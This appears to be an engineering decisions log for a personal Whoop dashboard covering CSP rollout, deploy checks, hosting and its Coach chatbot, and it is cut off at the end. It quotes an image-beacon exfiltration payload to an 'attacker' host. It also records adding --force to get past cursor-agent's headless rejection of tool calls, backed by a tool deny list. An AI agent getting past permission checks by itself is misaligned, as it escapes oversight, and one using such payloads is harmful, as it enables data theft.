# Decisions Log

Running log of architectural, scope, and process decisions for the Whoop Dashboard project. Newest entries at the top. Each entry is short — for deep rationale on a single locked decision, write an ADR alongside in `docs/decisions/YYYY-MM-DD-*.md` and reference it here.

Maintained via the `/decisions` skill. See `~/.claude/skills/decisions/SKILL.md` for the entry format and invocation rules.

---

## 2026-08-16: CSP ships report-only, and its violations are collected authenticated

**Decision:** Split the app's Content-Security-Policy in two. A small enforcing header (`frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, plus `upgrade-insecure-requests` in production) ships immediately from `next.config.ts` alongside `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy` and HSTS. The full candidate policy — `default-src 'self'`, nonce-based `script-src 'self'`, `img-src 'self' data: blob:` — ships as `Content-Security-Policy-Report-Only` from `src/proxy.ts`, which is the only place a per-request nonce can be minted. Violations are collected from the `securitypolicyviolation` DOM event and forwarded through the existing authenticated `/api/log/client`, land in `client_logs`, and render on `/logs` under a "Client events" card (`recentClientLogs` in `apps/web/src/lib/db/client-logs.ts`, previously written but never read — added as part of the same PR). No `report-uri`/`report-to` endpoint is added, and `AUTH_EXEMPT_PREFIXES` is unchanged. Flipping the candidate policy to enforcing is a separate, later change that must be justified by the collected reports — with the coverage limits below taken into account, not just an empty-looking report window.

**Rationale:** A CSP that breaks the app is worse than no CSP, and this repo deploys straight to a single live box with no staging tier — so the directives that can block a resource are measured before they are enforced. `object-src`, `base-uri`, and `form-action` are still enforced immediately despite `object-src` and `form-action` being genuine CSP *fetch*/action directives capable of blocking a resource (an `<object>`/`<embed>` load, a form submission) — they get no grace period not because they're incapable of blocking something, but because each was individually audited against this codebase: no `<object>`/`<embed>`/`<applet>` anywhere, and DOMPurify's default allowlist excludes both tags; the only `<form>` (`settings/page.tsx`) posts same-origin to `/api/auth/logout`, `/signin` uses a plain link, and Apple's `form_post` callback is governed by Apple's own CSP. `frame-ancestors` and `base-uri` are the only directives here that are not fetch directives at all. A standards `report-uri` collector would have to accept unauthenticated POSTs, because browsers strip credentials from violation reports; that means widening the auth-exempt surface and putting an abusable write endpoint on the public internet, to buy report coverage that a single-user dashboard gets from the DOM event for free. `img-src` is the directive that actually matters here: DOMPurify preserves `<img src="https://attacker/?leak=...">`, so the stored-XSS class from #492 can still exfiltrate through an image beacon with scripts fully blocked.

**Report coverage limits (read before flipping to enforcing):** the `securitypolicyviolation` listener attaches post-hydration and misses early-load violations; `/api/log/client`'s 10/s per-user rate limit silently drops the remainder of a violation burst; `CSP_REPORTS_PER_PAGE = 20` in `ClientLogBootstrap` is enforced per **layout mount**, not per page load, so a long-lived SPA session under-reports; only Chromium was driven during verification (Safari/iOS WKWebView unverified); and any inline script Cloudflare injects in front of the app (challenge pages, email obfuscation, RUM) never reaches this collector and could break outright at flip time. Full detail in the "Report coverage limits" doc comment atop `apps/web/src/lib/security-headers.ts`.

**Status:** active

**References:** #501, #492, `apps/web/src/lib/security-headers.ts`, `apps/web/src/proxy.ts`, `apps/web/next.config.ts`, `apps/web/src/components/ClientLogBootstrap.tsx`, `apps/web/src/app/(dashboard)/logs/page.tsx`

---

## 2026-08-11: Production deploys gate on the contained Cursor launcher

**Decision:** Install Cursor Agent at the standardized runtime path `/home/george/.local/bin/cursor-agent` and make `scripts/deploy` run a launcher canary before build or restart. The canary executes `--version` with the same manifest-backed minimal PATH used by Coach, and `scripts/deploy --check` reports the same readiness signal.

**Rationale:** The Oracle-to-Optiplex migration copied `COACH_CURSOR_AGENT_BIN` but not the executable, so every Cursor turn failed immediately with `ENOENT` while the web health check stayed green. Testing only the HTTP process cannot detect a missing optional subprocess or a self-update that adds an unavailable launcher dependency; a pre-restart canary catches both while leaving the currently running release untouched.

**Status:** active

**References:** #467, `scripts/check-cursor-agent.mjs`, `scripts/deploy`, `apps/web/src/lib/coach/cursor-launcher-tools.json`, `docs/operations/environment-and-deploy.md`

---

## 2026-08-07: Simulator debug sessions mint on opti through Fleet

**Decision:** Debug simulator launches mint the existing 30-day user JWT on Fleet node `opti`, reading `JWT_SIGNING_KEY` only from the protected production environment and returning only the signed token to the launcher. The launcher validates that token against the production API and injects it only through Debug-only `COACH_DEBUG_TOKEN`; Release builds continue to require Sign in with Apple. Do not add a public dev-auth endpoint, embed credentials, or print the signing key/token.

**Rationale:** Browser-mirrored simulators cannot reliably control Apple’s secure authorization sheet, but developer bypass must remain behind trusted operator access. Fleet replaces retired VM/Tailscale SSH while preserving the same server-side secret boundary and production authorization semantics.

**Status:** active

**References:** `apps/ios/scripts/run-dev-simulator.sh`, `apps/ios/Sources/CoachApp.swift`, `apps/ios/Sources/APIClient.swift`

---

## 2026-08-07: Production runtime and canonical data move to opti

**Decision:** Retire the Oracle `whoop-vm` and run the production web/API process, Cursor agent, canonical SQLite database, backups, secrets, and builds on Fleet node `opti`. Use user-level systemd with the pinned NVM Node 20.20.2 runtime, publish both hostnames through an outbound Cloudflare Tunnel, keep GitHub Actions CI-only, and make `scripts/deploy` the only release path. The Oracle instance must remain recoverable until its live database and environment have been migrated and verified on `opti`.

**Rationale:** The small Oracle instance repeatedly exhausted memory during dependency installation and builds, while splitting build, runtime, data, and rollback across two hosts increased ABI and operational failure modes. `opti` has sufficient capacity, stable Fleet access, and can keep the native build and runtime ABI identical; Cloudflare Tunnel provides public ingress without opening the home network.

**Status:** active

**References:** `scripts/deploy`, `systemd/whoop-web.service`, `systemd/whoop-cloudflared.service`, `docs/operations/environment-and-deploy.md`

---

## 2026-08-07: Production builds move from the runtime VM to the Optiplex fleet node

**Decision:** Run production dependency installation and Next.js compilation in an isolated worktree on Fleet node `opti`, inside the pinned `node:20-bullseye` Podman image. `whoop-vm` becomes artifact-only: it retains runtime secrets and the canonical SQLite database, verifies and stages the checksummed runtime archive, switches release paths during a brief service stop, restarts, and verifies the exact build SHA. GitHub Actions remains CI-only; an operator invokes the canonical `scripts/deploy` after verification.

**Rationale:** Two consecutive on-VM installs/builds exhausted the Oracle instance's 1 GB memory and swap, making both SSH and production HTTP unavailable. The Optiplex has compatible x86_64 Linux, 8 GB RAM, and a Fleet-managed access path; pinning Node 20 on Debian Bullseye also keeps native modules compatible with the production Node ABI and older glibc while preventing application secrets from leaving the VM.

**Status:** superseded by 2026-08-07 production runtime and canonical data move to opti

**References:** `scripts/deploy`, `.github/workflows/ci.yml`, `docs/operations/environment-and-deploy.md`

---

## 2026-08-07: Quiet Instrument constrains every web route through four layers

**Decision:** Rebuild the web UI around a four-layer contract: closed tokens, twelve enum-only primitives, an intent router with per-route hierarchy, and machine-enforced lint rules. Interaction uses foreground/background contrast rather than an `--accent` token; hue is reserved for brand identity, metric identity, and semantic state. Every migrated route gets exactly one hero metric, at most six quiet metrics, at most two charts above the fold, and zero resting bordered containers except genuinely tappable or elevated surfaces.

**Rationale:** The current surface drift comes from several simultaneously legal styling systems and undifferentiated information density, not from missing visual polish. A closed vocabulary plus numeric route budgets preserves all existing product behavior while making the quieter near-monochrome direction deterministic for future contributors and agents.

**Status:** active

**References:** `apps/web/src/styles/tokens.css`, `apps/web/src/components/primitives/`, Open Design `design-system-v2.html`, Open Design `design-system.html`, PR #481

---

## 2026-08-07: Simulator auth bypass stays behind trusted VM access

**Decision:** Debug simulator launches may bypass Sign in with Apple by minting a normal 30-day user session inside `whoop-vm` over Tailscale SSH and injecting it through `COACH_DEBUG_TOKEN`. The launcher validates the session before installation and suppresses secure system permission prompts for that Debug process; Release builds retain Apple authentication and the normal HealthKit and notification flow. Do not add a public development-auth endpoint or embed credentials in the app or repository.

**Rationale:** Browser-mirrored simulators cannot reliably render or control Apple's secure authorization sheets, but they still need valid production credentials to show the same data and threads as web. Reusing the existing JWT verifier behind authenticated Tailnet and sudo access provides the required developer convenience without creating an internet-facing backdoor or weakening production request authorization.

**Status:** superseded by 2026-08-07 simulator debug sessions mint on opti through Fleet

**References:** `apps/ios/scripts/run-dev-simulator.sh`, `apps/ios/Sources/CoachApp.swift`, `apps/ios/Sources/APIClient.swift`

---

## 2026-08-07: Boolean Cursor reasoning uses on/off switches

**Decision:** When Cursor exposes a reasoning parameter whose only values are `true` and `false`, web and iOS present one native-style Reasoning switch and label its state `Reasoning on` or `Reasoning off`. Continue persisting and forwarding Cursor's raw boolean tokens unchanged; non-boolean reasoning parameters retain their catalog-backed discrete choices.

**Rationale:** Raw protocol values are correct for validation and CLI execution but are implementation details, not useful model-picker copy. A boolean switch communicates the actual choice consistently across clients without inventing a lossy mapping for models that expose effort levels instead.

**Status:** active

**References:** `apps/web/src/components/coach/CoachModelPicker.tsx`, `apps/web/src/lib/coach/cursor-model-params.ts`, `apps/ios/Sources/CoachModelPicker.swift`, `apps/ios/Sources/CoachModelSelection.swift`

---

## 2026-08-07: Cursor reasoning follows the live model-parameter catalog

**Decision:** Preserve Cursor model `parameters` and `variants` from the account-scoped catalog, persist validated raw parameter selections per user and model, and pass them through the contained CLI using Cursor's bracket model syntax. Web and iOS expose a reasoning submenu only when that model advertises a controllable thinking, reasoning, effort, or thought-level parameter; fixed and unsupported models do not receive a synthetic control. Keep the direct HTTP catalog and `cursor-agent --mode ask` execution boundary instead of adding the Node 22-only SDK runtime.

**Rationale:** Cursor models do not share one universal effort enum: the catalog supplies each account's allowed parameter IDs, values, variants, and defaults, while the current CLI accepts parameterized selections such as `gpt-5.5[effort=high]`. Persisting raw validated values avoids lossy mappings between `max`, `xhigh`, `extra-high`, boolean thinking, and fixed-effort models while preserving the production Node 20 and MCP-containment constraints.

**Status:** active

**References:** `apps/web/src/lib/coach/cursor-model-params.ts`, `apps/web/src/lib/coach/cursor-models.ts`, `apps/web/src/lib/coach/cursor-loop.ts`, `apps/ios/Sources/CoachModelSelection.swift`

---

## 2026-08-07: Model-picker follow-up is UI parity, not a selection-flow refactor

**Decision:** Keep the existing model-first selection behavior and supported `None`, `Low`, `Medium`, `High`, and `Max` reasoning values unchanged. Limit the follow-up to model-list cleanup, responsive web positioning/scroll/focus accessibility, and an equivalent native iOS composer control backed by the existing settings and Cursor-catalog endpoints; file any larger flow redesign separately.

**Rationale:** The intended interaction is the existing Cursor-inspired selector with its hierarchy inverted, and the reported problems are presentation and accessibility defects. Sharing the current server preferences across web and iOS delivers cross-client parity without reopening provider behavior, chat sending, or navigation architecture.

**Status:** superseded by 2026-08-07 Cursor parameter decision

**References:** `apps/web/src/components/coach/CoachModelPicker.tsx`, `apps/ios/Sources/CoachModelPicker.swift`, `apps/ios/Sources/CoachModelSelection.swift`

---

## 2026-08-06: Coach supports next-draft composition and explicit thinking off

**Decision:** Keep the Coach textarea editable while a turn is active, but allow only one in-flight turn and keep attachments, model changes, and Send disabled until it finishes. Clear submitted text immediately, preserve any follow-up draft through success or failure, and make the picker model-first: the primary panel lists models and a per-model submenu owns its supported customization. Anthropic adds a `None` reasoning setting that sends `thinking: { type: "disabled" }`; active levels continue to use adaptive thinking plus `output_config.effort`.

**Rationale:** Drafting the next question should not be coupled to model latency, while concurrent sends would abort or corrupt the active turn. A model-first hierarchy matches the selection task before revealing only settings that the chosen provider truly supports, and an explicit disabled state covers the no-thinking workflow without simulating “off” with a low effort value.

**Status:** active

**References:** `apps/web/src/components/coach/ChatInput.tsx`, `apps/web/src/components/coach/useChatSend.ts`, `apps/web/src/components/coach/CoachModelPicker.tsx`, `apps/web/src/lib/coach/loop.ts`

---

## 2026-08-06: Coach composer owns model and provider-supported effort controls

**Decision:** Keep the Coach model picker inside the message composer and align the compact trigger immediately before Send. Persist a per-user Coach effort preference; Anthropic Sonnet 4.6 exposes `low`, `medium`, `high`, and `max` through `output_config.effort`, while Cursor exposes only its live account-scoped model IDs because the production CLI has no documented independent effort flag.

**Rationale:** Model and effort are per-turn choices users need at composition time, and the Claude-style right-aligned placement keeps both controls in the action path. Provider-aware controls ensure every visible option changes the real request instead of presenting a cosmetic or unsupported Cursor setting.

**Status:** superseded by 2026-08-06 Coach next-draft and explicit thinking-off decision

**References:** PR #471, `apps/web/src/components/coach/CoachModelPicker.tsx`, `apps/web/src/lib/coach/loop.ts`, `apps/web/src/lib/db/user_settings.ts`

---

## 2026-07-30: CI verifies every web change and CD delegates to the production deploy script

**Decision:** Add GitHub Actions verification (`npm ci`, tests, build, and deploy-script syntax) for pull requests and `main`, then deploy verified `main` commits through a protected `production` environment using an ephemeral Tailscale workload identity. GitHub receives only the Tailscale federation client ID/audience; application runtime secrets remain in the VM's canonical `apps/web/.env.local`. The deploy job is serialized, opt-in through `PRODUCTION_DEPLOY_ENABLED`, and invokes `scripts/deploy --ref "$GITHUB_SHA"` as the single implementation of backup, build, restart, verification, and rollback reporting.

**Rationale:** CI should prove the exact commit before production changes, while deployment must preserve the hardened SQLite online-backup and health-verification behavior already encoded in `scripts/deploy`. Workload identity avoids a permanent runner or long-lived SSH/auth key, environment approval creates an explicit production boundary, and the enable flag lets the workflow merge safely before the one-time tailnet policy and federation credential are configured.

**Status:** superseded by 2026-08-07 production fleet-build decision

**References:** `.github/workflows/ci.yml`, `scripts/deploy`, `docs/operations/environment-and-deploy.md`

---

## 2026-07-30: Coach work receipts persist bounded visible operations

**Decision:** Persist a versioned, bounded JSON work receipt only on each new turn's final visible assistant message. Receipts contain user-visible pre-tool commentary plus redacted tool inputs, status, timing, row counts, errors, and bounded results. Do not reconstruct receipts from `chat_logs`, expose hidden model reasoning, send receipts back to the model, backfill historical turns, or attach receipts to intermediate tool rows.

**Rationale:** A final-message receipt gives the web client durable progressive disclosure across reloads without duplicating model context or treating operational logs as a reconstructable source of truth. Version validation, secret-key redaction, and the existing 12KB response-capture policy keep the client-safe payload explicit and bounded while preserving the exact tool history users need to inspect.

**Status:** active

**References:** `apps/web/src/lib/coach/work-log-types.ts`, `apps/web/src/lib/coach/work-log.ts`, `apps/web/src/lib/db/coach.ts`, `apps/web/src/components/coach/CoachWorkDisclosure.tsx`

---

## 2026-07-30: Coach image uploads are persistent, encrypted, and provider-complete

**Decision:** Coach accepts up to three image-only or captioned images per turn on web and iOS, encrypts normalized JPEG bytes in SQLite, retains them until thread deletion, and exposes at most the six newest images to model context. The feature does not ship until both Anthropic vision blocks and Cursor's contained per-turn MCP image tool pass live recognition; it never silently changes providers. Medical images receive visible observations, ranked possibilities with explicit uncertainty, red flags, follow-up questions, and clinician guidance, never a confirmed image-only diagnosis.

**Rationale:** Persistent cross-device threads require durable tenant-scoped storage, while encrypted BLOBs keep sensitive health/body images inside the existing canonical backup and vault boundary without public URLs or base64 in message JSON. Equal provider support avoids uploads behaving differently under a user's selected model, and the medical boundary preserves useful analysis without claiming reliability the vision providers do not offer for diagnosis or complex scans.

**Status:** active

**References:** issues #451, #452, #453, #454; `apps/web/src/lib/coach/`, `apps/web/src/lib/db/coach.ts`, `apps/ios/Sources/ChatView.swift`

---

## 2026-07-30: Cursor catalog uses the public HTTP endpoint on Node 20

**Decision:** Fetch each credential's account-scoped model catalog from Cursor's `GET /v1/models` endpoint with Bearer authentication, matching the official SDK's catalog request and response shape. Keep the existing contained `cursor-agent` subprocess loop for Coach execution and do not ship `@cursor/sdk` in the web runtime.

**Rationale:** A read-only production check found Node 20.20.2, while `@cursor/sdk` 1.0.26 requires Node 22.13 or newer and brings telemetry plus platform binary packages for a single catalog call. The direct authenticated request preserves live per-account model discovery without making this settings PR depend on a production Node upgrade.

**Status:** active; supersedes the SDK dependency decision below

**References:** issue #449, PR #450, `apps/web/src/lib/coach/cursor-models.ts`, `apps/web/package.json`

---

## 2026-07-30: Cursor SDK owns model discovery, not Coach execution

**Decision:** Add `@cursor/sdk` to the web app and use `Cursor.models.list({ apiKey })` for per-user credential validation and authenticated model discovery. Keep the existing contained `cursor-agent` subprocess loop for Coach execution; persist the selected canonical SDK model ID in the existing `cursor:<model>` preference and pass that ID to the CLI. Personal-key precedence and encrypted storage remain unchanged.

**Rationale:** The SDK returns a structured, account-scoped catalog (`id`, display name, description, aliases, parameters, and variants), while CLI model output is presentation text and can change shape. A full SDK runtime migration remains out of scope because the current CLI boundary and MCP permission controls are production-hardened; discovery alone is low-risk and eliminates a stale hard-coded model list.

**Status:** superseded by 2026-07-30 Cursor HTTP catalog decision

**References:** issue #449, PR #450, `apps/web/src/lib/coach/cursor-models.ts`, `apps/web/src/lib/coach/cursor-loop.ts`

---

## 2026-07-30: Cursor credentials follow per-user BYOK precedence

**Decision:** Add encrypted `cursor_key` + `cursor_key_version` columns to `user_settings`. Cursor key resolution now mirrors Anthropic: the authenticated user's decrypted key wins, `CURSOR_API_KEY` remains the shared server fallback, and no key means the provider is unavailable for that user. Settings exposes masked save/remove controls and validates new keys with the non-inference `cursor-agent models` command before persisting.

**Rationale:** The original Cursor provider in PR #416 deliberately supported only one operator-managed key, which made a revoked shared credential take every Cursor user offline and did not match the product's BYOK direction. Per-user encrypted keys isolate rotation and failures while retaining the existing server fallback for users who do not provide one.

**Status:** superseded by 2026-07-30 Cursor SDK model discovery decision (credential storage and precedence remain active)

**References:** PR #416 (shared-only decision superseded), issue #442, PR #450, `apps/web/src/lib/coach/cursor-key.ts`, `apps/web/src/lib/db/user_settings.ts`, `apps/web/src/app/api/me/cursor-key/route.ts`

---

## 2026-07-28: Deploys must be verified, not assumed — `/api/health` + `scripts/deploy`

**Decision:** A deploy is not "done" until the running process reports the commit that was deployed. Added an auth-exempt `/api/health` returning `{sha, built_at}` (stamped at build time by `next.config.ts`, overridable via `COACH_BUILD_SHA`), and `scripts/deploy`, which snapshots the DB, pulls, builds **detached**, restarts, and then fails loudly if `/api/health` does not report the target sha. `scripts/deploy --check` reports drift without changing anything. The prose deploy recipe in `CLAUDE.md` is demoted to a reference-only `<details>` block.

Also locked: `MAX_CURSOR_WALL_MS` (120s) is documented as a subprocess **reaper** coupled to the iOS `timeoutInterval = 130` — raising it without raising the client first converts a logged `chat_logs` error into an invisible client-side drop. Per-turn Cursor workspaces now unregister themselves from `~/.cursor/projects/`. Domain-table primary keys are documented per-table (`sleep` is `(user_id, sleep_id)`, `workouts` is `(id)`), not as a uniform `(user_id, date)`.

**Rationale:** Prod ran three commits behind `main` for a day while the merged fix for a live coach-timeout bug sat undeployed; nine of the last hundred coach turns were failing and the only signal was a user noticing blank messages. Every failure mode here was *invisible rather than hard*: no build identity, a build that survives a dropped ssh session and holds its lock, a `~/.cursor/projects` entry leaked per turn (123 accumulated on the agent box, 60 on prod), and a test suite red on `main` for 7 tests — which meant "tests pass" had stopped being a usable signal. Fixing the observability is what makes the next incident cheap; the timeout fix itself was already merged.

**Status:** active

**References:** `scripts/deploy`, `apps/web/src/app/api/health/route.ts`, `apps/web/src/lib/build-info.ts`, `apps/web/next.config.ts`, `apps/web/src/proxy.ts`, `apps/web/src/lib/coach/cursor-loop.ts`; supersedes the manual deploy recipe in `CLAUDE.md`; see also the 2026-07-26 Cursor latency decision.

---

## 2026-07-26: Cursor latency path prioritizes safe one-pass turns; warm SDK deferred

**Decision:** Optimize the production Coach around Cursor Composer 2.5 Fast while retaining the contained `cursor-agent --mode ask` process boundary. Add per-stage Cursor timing, use a compact Cursor-specific prompt, preload an authoritative SQLite daily snapshot for current/last-night intents so common questions finish in one model pass, immediately flush the SSE connection, send `done` as the terminal event, and recover dropped iOS streams by reconciling persisted messages. Legacy `cursor:composer-2.5` preferences resolve in memory to the Fast variant.

**Rationale:** Direct measurements separated the turn into ~1.3s fresh CLI initialization, remote inference, ~40ms SQLite tool execution, model/tool/model round trips, and a small process-close tail. Composer 2.5 Fast reduced direct raw model wall time, while preloading current context removed the much larger second inference pass for common health-status questions. Cursor's official SDK proved that a warm executor can eliminate almost all repeated initialization time, but its local runtime allowed shell execution in the safety probe, ignored the CLI containment configuration, and could not enable its built-in sandbox on this host. Adopting it now would expose app/health data to a broader tool surface, so it remains deferred until enforceable read-only containment is available. “Near zero” therefore means immediate accepted/query feedback plus removal of local and round-trip overhead, not zero remote inference.

**Status:** active — implementation and PR verification in progress

**References:** `apps/web/src/lib/coach/cursor-loop.ts`, `apps/web/src/lib/coach/prompts.ts`, `apps/web/src/lib/coach/provider.ts`, `apps/web/src/app/api/chat/route.ts`, `apps/ios/Sources/ChatService.swift`, `apps/ios/Sources/ChatView.swift`

---

## 2026-06-28: HealthKit workout enrichment + Stats surface shipped (issues #425–429; PRs #431, #433)

**Decision:** Brought the per-second intra-workout heart-rate stream — which Whoop's *developer API* does not expose but the Whoop *app* writes into Apple HealthKit — into the dashboard, plus a longitudinal Stats surface. Locked calls:
1. **HealthKit is a real data source, not just an HR bridge.** iOS `HealthKitService` (anchored backfill on first run + `HKObserverQuery` background delivery) posts to `POST /api/ingest/healthkit` (Bearer). New `workouts` columns `source` (`whoop`|`healthkit`), `hr_series` (downsampled JSON, ~1pt/5s, ≤600 pts), `external_id` (idempotency) via lazy ALTER.
2. **Bidirectional dedup by ±60s start + compatible sport.** Forward (HK→existing Whoop row) enriches in `ingest.ts`; reverse (Whoop sync landing after a HK-only row) reconciles in `upsert.ts` (`reconcileHealthKitDuplicate`) — transfers `hr_series`/`external_id` onto the Whoop row, deletes the HK row, recomputes `daily_summary`. Without reverse-dedup the dual-wear race kept two rows → every aggregation double-counted (caught in review before prod). Shared match helpers live in `lib/healthkit/match.ts` to avoid an import cycle.
3. **Workout Detail page (`/workouts/[id]`)** — rows are now links (accordion removed); zone-gradient HR curve (server-rendered SVG) + derived Effort/Recovery (cardiac drift, recovery rate, TRIMP, time>90%) when a stream exists, graceful no-stream fallback otherwise. **Stats page (`/stats`)** — all-time totals, same-period YoY, by-sport, personal records, monthly trend, with honest partial-history states (DB only reaches back 2025-12-05; full YoY arrives with backfill).
4. **Scope cuts (deferred):** no CTL/ATL/TSB fitness-fatigue modeling; no Apple sleep/steps/VO2max ingestion (Whoop owns those — dual sources would conflict); no generic HealthKit-import framework (only the two payload shapes); per-sport drill-down filed as #430 (backlog).

**Rationale:** The HR time series is the only genuinely net-new measurement vs Whoop (everything HealthFit shows beyond it is inference recomputable from data we already store). Lazy-ALTER migration verified idempotent against a prod-DB snapshot before deploy; backend (migration + aggregations + ingest dedup + reverse-dedup) exercised end-to-end against that snapshot. **iOS ship gotchas (both hit, both fixed):** (a) the `com.apple.developer.healthkit` entitlement needs the HealthKit capability enabled on the App ID or signing/export fails — enabled via the App Store Connect API; (b) App Store validation (error 90683) requires BOTH `NSHealthShareUsageDescription` and `NSHealthUpdateUsageDescription` when the entitlement is present, even read-only — added in PR #433. **Standing note:** background delivery's runtime behavior is unverified (needs a physical device with the Whoop app writing to Health); only build/validation are confirmed.

**Status:** active — web deployed to prod VM 2026-06-28 (squash merge `59024c9`, DB backed up pre-deploy); iOS shipped to TestFlight Internal as build 24 (Xcode Cloud, processingState VALID). Known non-blocking follow-up: a Swift concurrency warning (`requestAuthorization()` actor-isolation) in `HealthKitService`.

**References:** issues #425 (ingest API), #426 (UI lift), #427 (detail), #428 (stats), #429 (iOS), #430 (drill-down, backlog); PRs #431 (feature), #433 (plist fix); `docs/design/healthkit-workouts/` (design brief + contract + OpenDesign mockups); `apps/web/src/lib/healthkit/`, `apps/web/src/lib/whoop/upsert.ts`, `apps/ios/Sources/HealthKit/`.

---

## 2026-06-26: Cursor coach requires `--force` for headless MCP tool execution (fix for thread #111 "Whoop queries blocked")

**Decision:** Added `--force` to the `cursor-agent` spawn in `cursor-loop.ts`. As of cursor-agent `2026.06.x`, headless `-p` runs leave `permissionMode: "default"`, which auto-**rejects** every MCP tool call (`"User rejected MCP: whoop-…"`); `--approve-mcps`/`--trust` and the `.cursor/cli.json` `permissions.allow` allowlist do NOT grant per-call execution in headless mode (verified across three allow-pattern variants — all rejected; only `--force` executes). Also hardened the stream-json parser to read tool name/input/timing from the `started` event (the `completed` event omits them → `name:"unknown"`, `duration_ms:0`) and to surface `result.rejected` as an **error** in `chat_logs` (it was silently logged as `ok`/empty, which masked the failure during debugging).

**Rationale:** Prod coach runs Cursor Composer 2.5; thread #111 returned generic "Whoop queries were blocked" answers because every `query_*` call was rejected. The **same** cursor-agent binary (`2026.06.19`) worked Jun 23 (thread #110) and failed Jun 25 (#111) → the permission behavior changed **server-side under a static binary** (inference from the timeline, not confirmed against a Cursor changelog). `--force` = allow-unless-denied; containment is preserved by the cli.json `deny` list (`Shell`/`Write`/`WebFetch`/`Read`) + `--mode ask` — verified live on prod that whoop tools return real recovery rows AND that a shell command stays denied under `--force`. **Tradeoff:** posture shifts from deny-by-default allowlist → allow-unless-denied. **Standing fragility:** the coach depends on a Cursor permission contract that can change server-side without a local version bump; the parser hardening is so the next such regression surfaces in `/logs` instead of as silent empty results.

**Status:** active (deployed to prod VM 2026-06-26, commit `0447667`; recovered from a concurrent-`next build` crash-loop during deploy — single clean rebuild restored service)

**References:** coach thread #111, commit `0447667`, `apps/web/src/lib/coach/cursor-loop.ts`; see also the Cursor Composer provider + route-level SSE keep-alive decisions

---

## 2026-06-21: Plans surface shipped — first Coach WRITE tool + recovery-tuned `/plans` + iOS Plans tab (PRs #423, #424)

**Decision:** Shipped a recovery-tuned Plans feature (the spine of the "recovery-driven training" direction): the Coach's first **write** tool plus a durable, structured `/plans` surface on web + iOS, replacing one-off chat text. Locked calls:
1. **v1 is recovery-aware with NO schedule engine** — today's session renders read-only; no per-exercise check-off persistence, no weekday→split-day mapping, no hand-editing (Coach-write + read only). The mock's decorative per-plan "fit %" was dropped (not stored).
2. **`save_workout_plan` semantics** — immediate write, no pre-write confirmation gate (the "Saved" chip is post-hoc from the `tool_use_end` SSE event); counts as a normal round-trip against `MAX_TOOL_ITERATIONS`; within-turn idempotency via a content hash in `ToolTurnState` (identical re-save returns the existing id with `deduped:true`).
3. **One `GET /api/plans → { plans, recovery }` serves web + iOS** (`requireAuth` Bearer→Cookie; no separate `/api/ios/plans`). The `recovery` block (`today?{date,score,band}`, `week[]`; bands high≥67 / mid 34–66 / low<34) is computed by a single shared helper (`lib/plans/recovery.ts`) used by both the page and the API so they cannot drift.
4. **`workout_plans` is tenant data** read via `forUser(userId)` but intentionally NOT a `scoped.test` `DOMAIN_TABLES` table (so it doesn't trip the CI guard while staying user-scoped).
5. **Cross-provider tool registration** — prod runs the Cursor (Composer) coach, which reads tools from the MCP allowlist in `coach-mcp/server.ts` (`EXPOSED_TOOL_NAMES`), NOT the Anthropic `TOOLS` array; both `query_workout_plans` and `save_workout_plan` were added there or the write tool would have been dead on prod. The MCP server's single shared `ToolTurnState` is safe ONLY because `cursor-loop.ts` spawns + tears down a fresh MCP server process per turn (documented invariant).
6. **iOS reduced to 4 tabs** (Home/Coach/Plans/Settings); Recovery/Sleep/Strain dropped from the tab bar but kept reachable via tappable KPI tiles → `navigationDestination` (re-route, not delete).

**Rationale:** Durable, structured, recovery-scaled plans accessed outside the chat. The "no schedule engine" cut keeps v1 honest (the contract has no per-day date, so a weekday→split mapping would invent a schedule). The shared recovery helper prevents page/API drift. Cross-provider registration was the headline risk — a tool in only the Anthropic `TOOLS` array is invisible to the prod Cursor coach. On deploy the `workout_plans` table was materialized with the app's exact `IF NOT EXISTS` DDL to close the cold-read window before the first `openWrite()` (reads don't trigger the lazy bootstrap).

**Status:** active (web deployed to prod VM 2026-06-21; iOS merged — TestFlight upload pending as a manual signing step)

**References:** PRs #423 (web), #424 (iOS); issues #421, #422; `docs/plans-contract.md` (shared contract); `apps/web/src/lib/coach/tools.ts`, `apps/web/src/coach-mcp/server.ts`, `apps/web/src/lib/plans/recovery.ts`, `apps/web/src/app/api/plans/route.ts`, `apps/web/src/app/(dashboard)/plans/`, `apps/ios/Sources/Plans/`; see also the Cursor Composer provider + route-level SSE decisions.

---

## 2026-06-21: Coach SSE keep-alive is a route-level silence watchdog (provider-agnostic); thread list event-driven; Web Vitals telemetry shipped

**Decision:** Three coach/observability changes shipped to prod (PRs #417, #418, #419):
1. **Coach thread list is event-driven** — removed the 5s `/api/threads` poll in `useThreadList.ts` (it ran for the whole `/coach` session). Refresh on mount + focus/visibility + after each send.
2. **Auto-title delivered on-stream + deterministic fallback** — the chat route runs `titleChatThread` before closing the SSE stream so the existing post-stream thread refresh picks it up (replacing the poll's only real job). `deriveTitleFromText` (`apps/web/src/lib/coach/title.ts`) derives a title from the first user message whenever the LLM title is unavailable.
3. **SSE keep-alive is a route-level silence watchdog** — in `apps/web/src/app/api/chat/route.ts`, a timer emits a bare `: hb` SSE comment after `HEARTBEAT_IDLE_MS` (8s) of no `send()` activity, reset by every real send. Lives **above** the provider dispatch so it covers both the Anthropic loop (`loop.ts`) and the Cursor subprocess loop (`cursor-loop.ts`). Reverses the PR #249 "no SSE keepalive" stance.
4. **Frontend Web Vitals telemetry shipped** — `perf_metrics` table (lazy-bootstrapped in `connection.ts`), `POST /api/perf` ingest (auth + per-user token bucket), `WebVitalsReporter` (next/web-vitals beacon from the dashboard layout), and a `/perf` page (p75 KPI cards + daily-p75 charts + recent samples).

**Rationale:** Reported iOS bug — after sending a coach message the thinking banner times out and the reply only appears after leaving/returning to the chat. Root cause: the coach turn goes silent on the wire during model thinking (and, on the Cursor path, also during `cursor-agent` subprocess startup and `thinking` events, which emit nothing to the client), so Cloudflare / the iOS 130s request timeout drops the SSE connection before `done`; the reply is persisted server-side, hence visible on reload. A first attempt put the heartbeat in `loop.ts` gated on Anthropic `thinking_delta` — but the primary user runs the coach on **Cursor** (`user_settings.model_pref = cursor:composer-2.5`), whose turns never enter `loop.ts`, so it never fired. Moving the keep-alive to the route as a silence watchdog makes it provider-agnostic and also covers tool-execution gaps. Verified live on prod Cursor: a turn emitted heartbeat frames during the silent startup window before the first text token. The PR #249 revert (keepalive judged a speculative band-aid) is reversed because there is now a concrete reproduction. The auto-title fallback was needed because titling is Anthropic-only and the prod Anthropic key is currently out of credits, so Cursor users' threads otherwise stay "New chat" forever (previously masked by the now-removed poll). Web Vitals telemetry was 